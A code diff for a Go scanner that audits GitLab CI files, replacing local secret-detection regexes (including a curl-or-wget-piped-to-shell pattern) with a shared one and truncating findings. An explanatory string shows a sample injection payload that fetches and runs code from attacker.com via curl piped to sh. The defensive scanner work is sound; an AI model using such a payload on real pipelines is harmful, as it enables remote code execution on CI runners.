@@ -2,7 +2,6 @@ package scanner
 
 import (
 	"os"
-	"regexp"
 	"strings"
 
 	"gopkg.in/yaml.v3"
@@ -35,12 +34,6 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 	}
 
 	var issues []Issue
-
-	// Regex for secrets (AWS Keys, Passwords, etc) - Shared with GitHub Scanner
-	awsKeyRegex := regexp.MustCompile(`(?i)AKIA[0-9A-Z]{16}`)
-	passwordRegex := regexp.MustCompile(`(?i)(password|passwd|secret|token|api_key)\s*[:=]\s*['"]?[a-zA-Z0-9\-_]{8,}['"]?`)
-	curlBashRegex := regexp.MustCompile(`(?i)(curl|wget).*\|\s*(bash|sh)`)
-
 	contentStr := string(data)
 
 	// Rule: Hardcoded Secrets globally in file
@@ -55,16 +48,23 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 			Fix:      "Move this to GitLab CI/CD Variables.",
 		})
 	}
-	if passwordRegex.MatchString(contentStr) {
+
+	matches := genericSecretRegex.FindAllString(contentStr, -1)
+	for _, match := range matches {
+		lowerMatch := strings.ToLower(match)
+		if strings.Contains(lowerMatch, "${{") || strings.Contains(lowerMatch, "$CI_") || strings.Contains(lowerMatch, "placeholder") || strings.Contains(lowerMatch, "example") || strings.Contains(lowerMatch, "replace") || strings.Contains(lowerMatch, "dummy") {
+			continue
+		}
 		issues = append(issues, Issue{
 			Rule:     "Potential Hardcoded Secret",
 			Severity: "HIGH",
 			Location: "Global (File content)",
-			PoC:      extractMatch(passwordRegex, contentStr),
+			PoC:      truncateString(match, 30),
 			Exploit:  "Attackers use automated tools to scan repos for keywords like 'password' or 'token' followed by high-entropy strings.",
 			Impact:   "Hardcoding secrets leads to accidental leaks and potential credential theft.",
 			Fix:      "Move this to GitLab CI/CD Variables.",
 		})
+		break
 	}
 
 	// Iterate through the generic map to find job definitions
@@ -134,7 +134,7 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 							Rule:     "Command Injection Risk",
 							Severity: "CRITICAL",
 							Location: jobScope + " > " + scriptType,
-							PoC:      scriptLine,
+							PoC:      truncateString(scriptLine, 40),
 							Exploit:  "An attacker submits a malicious merge request title or commit message like `\"; curl attacker.com/malware | sh #`. The variable is interpolated and executed by the shell.",
 							Impact:   "Remote Code Execution on the GitLab Runner.",
 							Fix:      "Pass the variable safely to a script file rather than executing it inline.",
